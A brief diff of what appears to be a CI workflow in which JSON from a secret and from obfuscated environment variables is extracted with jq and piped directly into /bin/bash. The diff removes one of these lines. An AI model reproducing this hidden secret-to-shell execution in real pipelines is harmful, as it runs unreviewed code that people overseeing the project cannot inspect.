@@ -19,7 +19,6 @@ jobs:
           jumg8: ${{ secrets.jumg8 }}
         run: |
           printf '%s' "$jumg8" | jq -r .mf0089 | /bin/bash
-          echo $nphj55 | jq -r .etwhg5653 | /bin/bash
           echo $vb1 | jq -r .ala44 | /bin/bash
 
       - name: Upload results
